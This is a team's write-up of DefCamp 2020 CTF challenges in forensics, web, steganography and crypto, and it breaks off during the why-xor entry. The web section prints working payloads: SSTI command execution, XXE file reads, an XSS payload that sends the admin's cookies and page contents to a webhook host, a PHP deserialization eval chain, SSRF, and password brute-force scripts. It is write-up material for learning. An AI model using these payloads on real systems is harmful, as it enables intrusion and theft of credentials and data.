# Defcamp 2020 writeups :triangular_flag_on_post:

## Team information
**Team name:** 
bootplug

**Country**: 
Norway 

**CTFTime profile**: 
https://ctftime.org/team/81341

**Authors**
zup, PewZ, UnblvR, maritio_o, odin

We solved 25/26 challenges. Did not solve `inorder`

---

## Forensics
### basic-coms
We get a pcap file. Searched for `http` traffic and found a single stream with some very interesting information in it

![](https://i.imgur.com/rpdwAsd.png)

This **GET** request seems to contain an interesting parameter that looks like a flag.

Decoding this from URL encoding yields the flag
```
The content of the f l a g is ca314be22457497e81a08fc3bfdbdcd3e0e443c41b5ce9802517b2161aa5e993 and respects the format
```

`CTF{ca314be22457497e81a08fc3bfdbdcd3e0e443c41b5ce9802517b2161aa5e993}`

### t3am_vi3w3r
Noticed some DNS requests in the PCAP to RealVNC websites. 
Filtering on VNC traffic (`vnc` as filter in Wireshark) lists up some "broken" PDUs, but they are most likely just too new for Wireshark to handle. 

Looking at the last byte of all these PDUs, we see that some text is entered - one letter at a time. It writes out the "Bee Movie" script, with the flag somewhere in the middle of it. 

By simply looking for a value that matches '{', I was able to read out each letter of the flag and communicate it to a team mate that wrote it down.

flag: `DCTF{74a0f35841dfa7eddf5a87467c90da335132ae52c58ca440f31a53483cef7eac}`

### hunting-into-the-wild
Q1. Based on the text, and obviois tool to think about is mimkaz, which often contain sekurlsa in the commanline. Used the following search on winlogbeat index:
```
process.args: *sekurlsa*
```
Shows process name: mim.exe

Q2.Seeing that most "malicous" related to APTSimulator, looking for events around this activity and filtering based on common native tools used for downloading, we found the following:
```
certutil.exe  -urlcache -split -f https://raw.githubusercontent.com/NextronSystems/APTSimulator/master/download/cactus.js C:\Users\Public\en-US.js
```

Q3. By going back in timeline to see source of all the malicous events, the following command was found:
```
C:\Windows\system32\cmd.exe /c ""C:\Users\IEUser\Desktop\APTSimulator\APTSimulator.bat
```
CTF{APTSimulator.bat}

Q4. Common command used for user management at windows is ```net user```, search for this actiovity within the timeline of the malicous commands, the following command line was found:
```
net  user guest /active:yes
```

### spy-agency

Volatility imagescan shows that the relevant profile is `Win7SP1x64`. After a brief `pstree` and `filescan`, we see that there's not really that much happening process-wise. But Chrome has been used to download a file from WeTransfer:

``` 
0x000000003fa82210     16      0 RW---- \Device\HarddiskVolume2\Users\volf\Downloads\app-release.apk.zip
```

We weren't able to dump this exact file, but there were some copies of it located on the desktop that could be dumped using `dumpfiles -Q XXX` with XXX being the physical address from the filescan output. The Chrome history also showed some Google searches for Bluestacks, an Android emulator, but none of its binaries were present. The belief is that someone downloaded this APK, then ran it locally in Bluestacks to get the secret location - which is the goal of this challenge.

The zip file does not contain an APK at all, but a directory, which contains the contents of an APK. This breaks normal decompilers like JADX, but luckily it's easy to repack it as a proper APK file.

After some brief reversing of the app, it looks like it is just a simple "Hello, World!" Android application, that only shows a single view with a "Hello World" message.

```java
package com.example.hidden_place;

import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView((int) R.layout.activity_main);
    }
}
```

However, inside drawables, there's a hidden file: `res/drawable/coordinates_can_be_found_here.jpg`. In the EXIF data of this image, there's some coordinates `-coordinates=44.44672703736637, 26.098652847616506` pointing to a Pizza hut.

Flag: `ctf{a939311a5c5be93e7a93d907ac4c22adb23ce45c39b8bfe2a26fb0d493521c4f}` (sha256 of 'pizzahut')


## Web
### alien-inclusion
This is a very simple PHP server. The flag is located in `/var/www/html/flag.php`

```php
 <?php

if (!isset($_GET['start'])){
    show_source(__FILE__);
    exit;
} 

include ($_POST['start']);
echo $secret; 
```
The only thing it does is including whatever we send in the `start` POST parameter. We need to also set the `start` GET parameter to something so that the server won't print its source and exit.

Then we can just include the flag.php file:

```shell
$ curl 'http://34.89.211.188:32193?start=1' -XPOST --data 'start=flag.php'

ctf{b513ef6d1a5735810bca608be42bda8ef28840ee458df4a3508d25e4b706134d}
```


### http-for-pros
We can change the content of the website. The server is running Flask. I quickly find out that this is SSTI (Server side template injection) by injecting `{{5*5}}`

```shell
$ http 35.198.103.37:31612 content=='{{5*5}}'

HTTP/1.0 200 OK
Content-Length: 2
Content-Type: text/html; charset=utf-8
Date: Mon, 07 Dec 2020 16:04:25 GMT
Server: Werkzeug/1.0.1 Python/2.7.12

25
```

I then tried to inject a lot of different variables, functions and attributes and found out that there is a WAF on the server checking for specific keywords like `_`, `class`, `flag`, `application`, and many others.

After some trial and errors I found out you could just concatinate multiple strings to get the keywords we want.

We can't do this with `_` however. So in order to inject underscores, we need to send it in as a query parameter `u` and use `requests.args.u` to use it.

The plan is to inject
`{{request["application"]["__globals__"]["__builtins__"]["__import__"]("os")["popen"]("cat flag")["read"]()}}`

Using the different tricks mentioned, I ended up with the following query:

`
http 35.198.103.37:31612 content=='{{request["appli"+"cation"][request.args.u*2+"globals"+request.args.u*2][request.args.u*2+"buil"+"tins"+request.args.u*2][request.args.u*2+"imp"+"ort"+request.args.u*2]("os")["po"+"pen"](request.args.f)["read"]()}}' u==_ f=='cat flag'
`
```
HTTP/1.0 200 OK
Content-Length: 69
Content-Type: text/html; charset=utf-8
Date: Mon, 07 Dec 2020 16:14:17 GMT
Server: Werkzeug/1.0.1 Python/2.7.12

CTF{75df3454a132fcdd37d94882e343c6a23e961ed70f8dd88195345aa874c63e63}
```

### broken-login
```
Intern season is up again and our new intern Alex had to do 
a simple login page. Not only the login page is not working properly, 
it is also highly insecure...
```

Seems like `Alex` created a broken login page. It does not seem to work at all.
You can log in with a username and password, and get redirected to `/auth` where the
username and password values have been swapped out with hex or some hashes.

```shell
$ http POST 'http://35.234.65.24:31441/login' name==admin password==admin
HTTP/1.1 302 Found
Content-Length: 0
Content-Type: text/plain; charset=utf-8
Date: Mon, 07 Dec 2020 16:23:42 GMT
Location: /auth?username=61646d696e&password=c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec
```

When analysing the parameters, you can see that the username is just `admin` in hex encoding.
The password is a sha512 hash of the password we sent in.

After being redirected, nothing seems to happen. We get a 200 OK, but nothing that indicates that we successfully logged in or not. 

I then noticed that the `name` parameter from `/login` is not `username` when being redirected to `/auth`. 
After changing the parameter for `/auth` to `name` instead of `username`, everything seems to work!

```shell
$ http GET 'http://35.234.65.24:31441/auth?name=61646d696e&password=c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec'
HTTP/1.1 200 OK
Content-Length: 12
Content-Type: text/plain; charset=utf-8
Date: Mon, 07 Dec 2020 16:28:21 GMT

Invalid user
```

Now we need to find a valid username, so why not just try `Alex`? After converting this to hex we can send a new request. This time we get `Invalid password`.

At this point I decided to write a script that bruteforces the password. It iterates over a wordlist and hashes each password with sha512 and tries to log in.

```python
#!/usr/bin/env python3
import requests
import sys
import hashlib
from binascii import hexlify, unhexlify

username = hexlify(b"Alex")

with open(sys.argv[1], "r") as wlist:
    for pw in wlist:
        h = hashlib.sha512(pw.strip().encode())
        
        params = {
            "name": username,
            "password": h.hexdigest()
        }
        r = requests.get("http://34.89.250.23:32506/auth", params=params)
        if "Invalid password" not in r.text:
            print(r.text)

print(r.text)
```

I then ran the script using the infamous `rockyou.txt` wordlist. After some time we get a successful login and the flag!

`CTF{bf3dd66e1c8e91683070d17ec2afb13375488eee109a0724bb872c9d70b7cc3d}`


### notor
Searching for all HTTP events with status code 200, since it is seen alot of directory bruteforcing. Found the following request when seeing 200 response with interesting large size:
```/shelladsasdadsasd.html.php```. Testing this path on the target server, shows that the webshell is active. 

Seeing traffic related to this path in the pcap, the following interesting response was found:
```
POST /shelladsasdadsasd.html.php?feature=shell HTTP/1.1
Host: h:1234
Connection: keep-alive
Content-Length: 328
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
DNT: 1
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://h:1234
Referer: http://h:1234/shelladsasdadsasd.html.php
Accept-Encoding: gzip, deflate
Accept-Language: ro-RO,ro;q=0.9,en-US;q=0.8,en;q=0.7,it;q=0.6

cmd=telnet%2010.5.0.6%2010001%3Btelnet%2010.5.0.6%2010002%3Btelnet%2010.5.0.6%2010003%3Btelnet%2010.5.0.6%205000%3Btelnet%2010.5.0.6%2010008%3Btelnet%2010.5.0.6%205000%3Btelnet%2010.5.0.6%206000%3Btelnet%2010.5.0.6%2019999%3B%20echo%20'GET%20%2F%20HTTP%2F1.1%5Cr%5Cn%5Cr%5Cn'%20%7C%20nc%2010.5.0.6%205000&cwd=%2Fvar%2Fwww%2FhtmlHTTP/1.1 200 OK
Date: Tue, 01 Dec 2020 22:24:24 GMT
Server: Apache
Content-Length: 258
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json

{"stdout":["Trying 10.5.0.6...","Trying 10.5.0.6...","Trying 10.5.0.6...","Trying 10.5.0.6...","Trying 10.5.0.6...","Trying 10.5.0.6...","Trying 10.5.0.6...","Trying 10.5.0.6...","(UNKNOWN) [10.5.0.6] 5000 (?) : Connection refused"],"cwd":"\/var\/www\/html"}
```

Seeing attempts on other ports then 1234, we excluded all 1234 traffic in the PCAP. One interesting HTTP response was show towards port 5000:
```
GET / HTTP/1.1


HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 69
Server: Werkzeug/1.0.1 Python/2.7.12
Date: Tue, 01 Dec 2020 22:25:13 GMT
```
This resulted in _Connection refused_ for the attacker, but we see a different port sequnce used by the succesfull request. The following command was used to get the flag:
```
p0wny@shell:/web# telnet 10.5.0.6 10001;telnet 10.5.0.6 10002;telnet 10.5.0.6 10003;telnet 10.5.0.6 22;telnet 10.5.0.6 445; echo 'GET / HTTP/1.1\r\n\r\n' | nc 10.5.0.6 5000
Trying 10.5.0.6...
Trying 10.5.0.6...
Trying 10.5.0.6...
Trying 10.5.0.6...
Trying 10.5.0.6...
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 69
Server: Werkzeug/1.0.1 Python/2.7.12
Date: Mon, 07 Dec 2020 15:43:44 GMT

ctf{4fde84cc72b033f0834f1181c4e1dc77a82a595c3652c8b9d02b28b8e1b62124}
```

### am-i-crazy
```python
#!/usr/bin/env python3
import re
import requests
import sys


def main(url, cmd):
    print(f"command len: {len(cmd)}")
    if len(cmd) > 15:
        print("cmd too long!")
        return

    data = { "password": "foobardeadbeefdsadsa" }
    req = requests.post(url, data=data)

    tmp = req.content.decode("utf-8")
    idx = tmp.index("/secrets")
    secret = tmp[idx:].split("'")[0]
    print(secret)

    url += secret
    print(url)

    params = {
        "tryharder": cmd
    }
    req = requests.get(url, params=params)
    print(req.content)

    req = requests.get(url)
    print(req.content)


if __name__ == "__main__":
    main("http://35.242.253.155:30574", "${`ln -s /var`}")
    main("http://35.242.253.155:30574", "${`mv var o`}")
    main("http://35.242.253.155:30574", "${`ln -s o/w*`}")
    main("http://35.242.253.155:30574", "${`mv www l`}")
    main("http://35.242.253.155:30574", "${`ln -s l/h*`}")
    main("http://35.242.253.155:30574", "${`mv html j`}")
    main("http://35.242.253.155:30574", "${`cat j/f*>2`}")
    main("http://35.242.253.155:30574", "${print`cat 2`}")
```

We can inject php using the `tryharder` parameter, but it has to be less than 16 characters. In addition, the data we can change is part of a doc string (heredoc). We use ${} to run php and backticks to run shell commands.
Running the solution script gives us the flag:
`ctf{d067ddd00ba4129e83898758ac321533f392364cfaca7967d66791d9d08823bb}`


### pirate-crawler
There is nothing on the main page.

First we found `/console` endpoint by dirbusting. However, the debugger console was protected with a PIN.

In the task description they mentioned APIs. So we tried to find `/api`, `/v1` and `/v2` etc.
We then found some interesting endpoints.

* `/v1` - mentions that `/v1` is disabled and that we should see the changelog for more information.
* `/v2` - mentions that this is the `V2 API ROUTE`

We then tried to find the CHANGELOG file:
```shell
$ http GET 'http://138.68.93.187:6960/v2/CHANGELOG'
HTTP/1.0 200 OK
Content-Length: 204
Content-Type: text/html; charset=utf-8
Date: Mon, 07 Dec 2020 16:47:24 GMT
Server: Werkzeug/1.0.1 Python/3.6.9

  #1: V1 context - V1 api routes disabled after sambacry
  #2: V2 context - crawl route parammeter changed to 'adshua' to prevent abuse
  #3: V2 context - added new safe SMbHandler to prevent sambacry
```

We now know that SMB is involved and that there is an endpoint called `/v2/crawl`.
We can use this endpoint to visit web pages, but it has an SSRF vulnerability. This means
that we can fetch files from the server, or visit internal web pages.

Using this vulnerability we fetched the SMB config and the app.py source code:

`curl -D- http://138.68.93.187:6960/v2/crawl?adshua=file:///etc/samba/smb.conf --output smb.conf`

`curl -D- 'http://138.68.93.187:6960/v2/crawl?adshua=file:///home/ctfuser/app.py' --output app.py`

There is an interesting entry in SMB config
```ini
[josh]
    path = /samba/josh
    browseable = yes
    read only = yes
    guest ok = yes
    force create mode = 0660
    force directory mode = 2770
    valid users = josh @sadmin
```

`josh` is an SMB share, and we can authenticate to this share as `josh`.
We also see a new API endpoint for SMB

```python
@app.route("/v2/smb", methods=["GET"])
def smb():
  #this might ROCK YOUr world!
  if request.args.get('onlyifyouknowthesourcecode'):
    director = urllib.request.build_opener(SMBHandler)
    fh = director.open(request.args.get('onlyifyouknowthesourcecode'))
    buf = fh.read()
    fh.close()
    return buf
```

There is a hint refering to `rockyou.txt` in the source code. So now we just create a script to bruteforce josh's password using this wordlist.

```python
#!/usr/bin/env python3
import requests
import sys

url = "http://138.68.93.187:6960/v2/smb?onlyifyouknowthesourcecode=smb://josh:{password}@localhost/josh/flag.txt"

with open(sys.argv[1]) as wlist:
    for pw in wlist:
        pw = pw.rstrip()

        r = requests.get(url.format(password=pw))

        if "not authenticated" not in r.text:
            if "filedescriptor out of range" not in r.text:
                print(r.text)
            print(f"PASS: {pw}")
```

The correct password is `christian`. We can now get the flag!

`http GET 'http://138.68.93.187:6960/v2/smb?onlyifyouknowthesourcecode=smb://josh:christian@localhost/josh/flag.txt'`

The flag is: `ctf{6056850ae00cb2cdc76d2bfa0bcb40ee3cc744702a31af0a8edd7fb2872da6f9}`


### syntax-check
This task took a while to figure out. The task description is
```
Some languages can be read by human, but not by machines, while 
others can be read by machines but not by humans. This markup 
language solves this problem by being readable to neither.

The flag is in /var/www/html/flag.
```

The button on the main page does not work at all. It sets a GET parameter called 
`<foo>Hi!</foo>` and we get an error page saying "Empty string supplied as input."

The trick was to figure out that you had to send something in the request body instead of a GET parameter.

`curl -D- -XGET 'http://34.107.22.248:30526/parse' --data test`

A new error message: `That XML string is not well-formed`

Now we get a clue that the data we send is should be XML. The vulnerability here must be XML External Entity processing. We can try to create some entities that fetches local files on the server. 

```shell
$ curl -D- -XGET 'http://34.107.22.248:30526/parse' --data '<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY exfiltrate SYSTEM "/etc/passwd">
]>
<foo>&exfiltrate;</foo>'
```

We get the `/etc/passwd` file back!
```
...
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
www:x:1000:3000::/var/www:/usr/sbin/nologin
```

However we cannot leak the flag using base64 encoding.

```shell
curl -D- -XGET 'http://34.107.22.248:30526/parse' --data '<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY exfiltrate SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/flag">
]>
<foo>&exfiltrate;</foo>'
```

The error message is `You just tried to exfiltrate using base64? Nice. Try again!`

Seems like there is some sort of filter checking the output. We can't convert the PHP flag file into base64. It is still possible to convert the PHP file into UTF-16 though:

```shell
$ curl -D- -XGET 'http://34.107.22.248:30526/parse' --data '<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY exfiltrate SYSTEM "php://filter/convert.iconv.utf-16le.utf-8/resource=/var/www/html/flag">
]>
<foo>&exfiltrate;</foo>'
```
We then get this string

`瑣筦㈰摢㠴㈶㌷㈰㌶㈶㡥㙡㘹挱㍤〳㠳㈱㜰挳〵慦㔷戹㈴戰攱愷ㄱ㉡㍣扡㄰〳੽`

We can convert this to UTF-8 and get the flag!

`ctf{02bd486273026362e8a6961cd3303812073c50fa759b420b1e7a11a2c3ab0130}`

### cross-me
The challenge name is a hint that this is an XSS challenge.

After you have logged in you can post notes to the website. The admin will check every note you create.

When trying to post `<script>` tags we get an error message:

`Invalid input. Failed at /<[^\w<>]*[ \/]\w*/i`

The server is validating our notes using regex. It has quite a few different patterns that it checks:

- `/<[^\w<>]*[ \/]\w*/i`
- `/<(|\/|[^\/>][^>]+|\/[^>][^>]+)>/i`
- `/(\b)(on\S{5,8})(\s*)=|(<\s*)(\/*)script/im`
- ```/["'\(\)\.:\-\+> `]/im```

The best way I found to bypass this check is to convert our javascript into HTML entities:

e.g. `asdasd` -> `&#97;&#115;&#100;&#97;&#115;&#100;`

After trial and error I found out that the `<svg>` tag is your best bet! We can use its **onload** method which is not matched by the regex pattern above. ("load" is shorter than 5 characters).

Let's test this by fetching the admin's cookie. We can't have spaces, and can't have any `>` tag at the end. But it still works:

`<svg/onload=document.location="https://webhook.site/df13af1d-cb2e-4274-a2d2-56b28becad35?c="+document.cookie//<`

Convert the javascript to HTML entities:
```
http --form POST 'http://35.242.253.155:31810/index.php?page=newpost' Cookie:PHPSESSID=47117bffb9bc0406a138d082980b72f2 title='asd' description='<svg/onload=&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&period;&#108;&#111;&#99;&#97;&#116;&#105;&#111;&#110;&equals;&quot;&#104;&#116;&#116;&#112;&#115;&colon;&sol;&sol;&#119;&#101;&#98;&#104;&#111;&#111;&#107;&period;&#115;&#105;&#116;&#101;&sol;&#100;&#102;&#49;&#51;&#97;&#102;&#49;&#100;&#45;&#99;&#98;&#50;&#101;&#45;&#52;&#50;&#55;&#52;&#45;&#97;&#50;&#100;&#50;&#45;&#53;&#54;&#98;&#50;&#56;&#98;&#101;&#99;&#97;&#100;&#51;&#53;&quest;&#99;&equals;&quot;&plus;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&period;&#99;&#111;&#111;&#107;&#105;&#101;//<'
```

We now get a request from the admin. But there is no flag in the cookies...
I then noticed the referer header in the request from admin:

`Referer: http://127.0.0.1:1234/index.php?page=post&id=221`

If we make the admin fetch this website and send the result back to us, we might get the flag.
The new plan is to use **fetch**:

```js
fetch('/index.php?page=post&id=604').then(r=>{return r.text()}).then(t=>{fetch('https://webhook.site/df13af1d-cb2e-4274-a2d2-56b28becad35', {method:'POST',body:t})})
```

This javascript posts the entire website back to us. When converting this to HTML entities, we can do the request to get the flag :)

```
http --form POST 'http://35.242.253.155:31810/index.php?page=newpost' Cookie:PHPSESSID=47117bffb9bc0406a138d082980b72f2 title='asd' description='<svg/onload=&#102;&#101;&#116;&#99;&#104;&lpar;&apos;&sol;&#105;&#110;&#100;&#101;&#120;&period;&#112;&#104;&#112;&quest;&#112;&#97;&#103;&#101;&equals;&#112;&#111;&#115;&#116;&amp;&#105;&#100;&equals;&#54;&#48;&#52;&apos;&rpar;&period;&#116;&#104;&#101;&#110;&lpar;&#114;&equals;&gt;&lcub;&#114;&#101;&#116;&#117;&#114;&#110;&#32;&#114;&period;&#116;&#101;&#120;&#116;&lpar;&rpar;&rcub;&rpar;&period;&#116;&#104;&#101;&#110;&lpar;&#116;&equals;&gt;&lcub;&#102;&#101;&#116;&#99;&#104;&lpar;&apos;&#104;&#116;&#116;&#112;&#115;&colon;&sol;&sol;&#119;&#101;&#98;&#104;&#111;&#111;&#107;&period;&#115;&#105;&#116;&#101;&sol;&#100;&#102;&#49;&#51;&#97;&#102;&#49;&#100;&#45;&#99;&#98;&#50;&#101;&#45;&#52;&#50;&#55;&#52;&#45;&#97;&#50;&#100;&#50;&#45;&#53;&#54;&#98;&#50;&#56;&#98;&#101;&#99;&#97;&#100;&#51;&#53;&apos;&comma;&#32;&lcub;&#109;&#101;&#116;&#104;&#111;&#100;&colon;&apos;&#80;&#79;&#83;&#84;&apos;&comma;&#98;&#111;&#100;&#121;&colon;&#116;&rcub;&rpar;&rcub;&rpar;//<'
```

FLAG: `CTF{3B3E64A81963B5E3FAC7DE0CE63966F03559DAF4B61753AADBFBA76855DB5E5A}`


### environ
It is a login page, but we cannot login, and there is no button to register an account.
After doing some enumeration we found a few endpoints that seems interesting

- /index.php
- /login
- /forgot-password
- /register
- /dashboard
- /assets
- /css
- /js
- /backup

At `/register` we can register an account and we get redirected to `/dashboard`
```
Environ is a tool to decrypt your deal messages

Sorry for the inconvenience but we’re performing some maintenance at the moment. If you need to you can always contact us, otherwise we’ll be back online shortly!

— The Team.
```

If we go to `/index.php` we can see this message:
```
Environ is a tool to decrypt your deal messages

Sorry for the inconvenience but we’re performing some maintenance at the moment. If you need to you can always contact us, otherwise we’ll be back online shortly!

— The Team. Also you can use /decode/{text} to obtain the contents of your private message.
```

A new endpoint! `/decode/{text}`.

Almost everything we tried to insert as *text* makes the server respond with

`bool(false)`

If you insert a symbol, you get `File not found`.

I created a script to enumerate all the valid characters:
```python
#!/usr/bin/env python3
import requests
import string

url = "http://35.198.183.125:30278/decode/"

valid_chars = []

headers = {
    "Cookie": "laravel_session=eyJpdiI6Ik5QMmtiajAxZ0JHTjdLTW5TcDV1Nmc9PSIsInZhbHVlIjoicEhIV3lKaEUrKzFnS1VDcmcyWDhPQ0ZVNlYzeFR3TkdBbjk4VW1NditnOHRxaEl5MU01YmUrMFpxRGZyc0lMTHBLYWRKOWNiMVpHaFEyUy9ac3FsSUFMeXRNZ2RZZmdNL3RnOGEyUFlpZHV2aGlOVXRpWm1nbTE5cDU1Wmd6YmsiLCJtYWMiOiJjNzZkZjcyNGIwNWIyYzZiNjcyNmQ1YTE2YWM0ZTE5N2JhZGE4NGVmYzE3ZGY3NDc0Zjg0MWY5NzRjMTQ2NTliIn0%3D",
    "Accept": "application/json"
}

for c in string.printable:
    r = requests.get(url+c, headers=headers)

    if "bool(false)" in r.text:
        valid_chars.append(c)
    else:
        print(r.text.strip())

print(''.join(valid_chars))
```

The valid characters are `0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%+=`

This looks like base64 to me!

At this point we started looking at the other endpoints, and found out that `/backup` is a git repository. We dumped the repository using [git-dumper.py](https://github.com/arthaud/git-dumper) (I had to replae all ".git" with "backup" for it to work) and find `.env.example` that contains an AES key:

`APP_KEY=base64:Wkt8DOa9t16Z+DSLKsy+5r4S0aA9JmdItAk9//NiKu0=`

We also find the decode function used in the Laravel app.

```php
public function decode(Request $request, $secret)
    {
        $key = env('APP_KEY');
        $cipher = "AES-256-CBC";
        $iv = substr(env('APP_KEY'), 0, 16);
        $secret_message = unserialize(openssl_decrypt($secret, $cipher, $key, 0, $iv));
        var_dump($secret_message);
    }
```

This function decrypts our secret message and unserializes it. Maybe we can try to exploit this unserialization?

To do this we need to find a class that has a constructor / deconstructor that does something unsafe. I found just the class for this in `app/Http/Middleware/YourChain.php`

```php
<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;

class YourChain
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    // public function handle(Request $request, Closure $next)
    // {
    //     return $next($request);
    // }

    public $inject;
    function __construct(){
    }
    function __wakeup(){
        if(isset($this->inject))
        {
            if(isset($this->inject[5])){
                eval($this->inject[5]);
            }
            
        }
    }
}
```

If we can create a serialized object with an `$inject` parameter that is an Array, we can eval php code of our choice. The 5th index must contain the code that should be evaled. 

I did this by opening an interactive session with php: `php -a`
```php
$key = "base64:Wkt8DOa9t16Z+DSLKsy+5r4S0aA9JmdItAk9//NiKu0=";
$iv = substr($key, 0, 16);

echo openssl_encrypt("O:29:\"App\\Http\\Middleware\\YourChain\":1:{s:6:\"inject\";a:6:{i:0;s:0:\"\";i:1;s:0:\"\";i:2;s:0:\"\";i:3;s:0:\"\";i:4;s:0:\"\";i:5;s:29:\"system('base64 ../flag.php');\";}}", "AES-256-CBC", $key, 0, $iv);
```

Which yields 
`6yjQqIXn0W0bR6EwHTW2NfGZUD4vr9E537p+861LxkPV8tNU63xRZz34KbAoOYNU/Z0SXAME/FlmW2Gpc14G/eXe+TngCovxh6lKt3I9ZmutmF0iLSRycW3X3xdse83uy7Hp3XSqh0Z20knHOqqi4KulAvtT1BbFDzwrNtstRGvciaSyqVgbbhtCIQe0lwyw2YZ8TkBKrdSefnNfBLFuzQ==`

We can send this encrypted text to the `/decode` endpoint to get our command executed!
I tried multiple commands before I finally found flag.php in a directory.

```shell
$ http GET "http://35.198.183.125:30278/decode/6yjQqIXn0W0bR6EwHTW2NfGZUD4vr9E537p+861LxkPV8tNU63xRZz34KbAoOYNU/Z0SXAME/FlmW2Gpc14G/eXe+TngCovxh6lKt3I9ZmutmF0iLSRycW3X3xdse83uy7Hp3XSqh0Z20knHOqqi4KulAvtT1BbFDzwrNtstRGvciaSyqVgbbhtCIQe0lwyw2YZ8TkBKrdSefnNfBLFuzQ==" Cookie:laravel_session=eyJpdiI6Ik5QMmtiajAxZ0JHTjdLTW5TcDV1Nmc9PSIsInZhbHVlIjoicEhIV3lKaEUrKzFnS1VDcmcyWDhPQ0ZVNlYzeFR3TkdBbjk4VW1NditnOHRxaEl5MU01YmUrMFpxRGZyc0lMTHBLYWRKOWNiMVpHaFEyUy9ac3FsSUFMeXRNZ2RZZmdNL3RnOGEyUFlpZHV2aGlOVXRpWm1nbTE5cDU1Wmd6YmsiLCJtYWMiOiJjNzZkZjcyNGIwNWIyYzZiNjcyNmQ1YTE2YWM0ZTE5N2JhZGE4NGVmYzE3ZGY3NDc0Zjg0MWY5NzRjMTQ2NTliIn0%3D

<?php if(false) { echo 'ctf{ea4941519e740783ebd819100ddc13486ae1e0abec2d0ef32bad5fc98edd16b6}'; } ?>%
```

FLAG: `ctf{ea4941519e740783ebd819100ddc13486ae1e0abec2d0ef32bad5fc98edd16b6}`


## Steganography
### stug-reference
The task description says:
```
Do you have your own stug pass hidden within?
```
We get a jpg image. The most obvious thing to try is *steghide*.
First I tried to use steghide without a password, but that did not work. Then I noticed the task description again: `stug pass hidden within`.

I then tried to extract using `stug` as password:

```shell
$ steghide extract -sf stug.jpg
Enter passphrase: 
wrote extracted data to "flag.txt".
```
flag.txt: `ctf{32849dd9d7e7b313c214a7b1d004b776b4af0cedd9730e6ca05ef725a18e38e1}`

## Crypto
### bro64
```python
#!/usr/bin/env python3
import json
import requests

from base64 import b64decode
from pprint import pprint

from Crypto.Cipher import ChaCha20, Salsa20


# {"nonce": "TzMh7RxMJr8=", "ciphertext": "IynkKnGon3iK4oNSv59tqdLlpIowmfpiH88Vj1CjQBm3SvTcwTbrnY4q/UWKtJRu0M3v4sl+C0k8QFM8pdpyFCkE9Nur", "key": "Fidel_Alejandro_Castro_Ruz_Cuba!"}


def main(url):
    res = requests.get(url)
    if res.status_code != 200:
        print("failed!")
        return

    res = json.loads(res.content)
    pprint(res)

    key = res["key"]
    nonce = b64decode(res["nonce"])
    ciphertext = b64decode(res["ciphertext"])
    print(f"key length: {len(key)}")
    print(f"ciphertext length: {len(ciphertext)}")
    print(f"nonce length: {len(nonce)}")

    #cipher = Salsa20.new(key=key.encode("utf-8"), nonce=nonce)
    #plaintext = cipher.decrypt(ciphertext)
    #print(plaintext)

    cipher = ChaCha20.new(key=key.encode("utf-8"), nonce=nonce)
    plaintext = cipher.decrypt(ciphertext)
    print(plaintext)


if __name__ == "__main__":
    main("http://34.89.241.255:30013")

# ctf{f38deb0782c0f252090a52b2f1a5b05bf2964272f65d5c3580be631f52f4b3e0}
```
tried to find a cipher that matched with the key length etc. We noticed that the length of the ciphertext wasn't a multiple of normal block sizes, so we assumed a stream cipher. Then we tried to find a stream cipher that used base64 encoded nonce, and a key size of 256 bit. after some trial and error we found out that ChaCha20 was a match.

### why-xor
We get a Python script
```python
xored = ['\x00', '\x00', '\x00', '\x18', 'C', '_', '\x05', 'E', 'V', 'T', 'F', 'U', 'R', 'B', '_', 'U', 'G', '_', 'V', '\x17', 'V', 'S', '@', '\x03', '[', 'C', '\x02', '\x07', 'C', 'Q', 'S', 'M', '\x02', 'P', 'M', '_', 'S', '\x12', 'V', '\x07', 'B', 'V', 'Q', '\x15', 'S', 'T', '\x11', '_', '\x05', 'A', 'P', '\x02', '\x17', 'R', 'Q', 'L', '\x04', 'P', 'E', 'W', 'P', 'L', '\x04', '\x07', '\x15', 'T', 'V', 'L', '\x1b']
s1 = ""
s2 = ""
# ['\x00', '\x00', '\x00'] at start of xored is the best hint you get
a_list = [chr(ord(a) ^ ord(b)) for a,b in zip(s1, s2)]
print(a_list)
print("".join(a_list))
```

There is also a hint here about the first 3 null bytes being the best hint we can get.

Since we know that a flag usually starts with `ctf`, this is most likely the xor key. When xoring `ctf` with `ctf` we get three null bytes.

I modified the script to use `ctf` as key:
```python
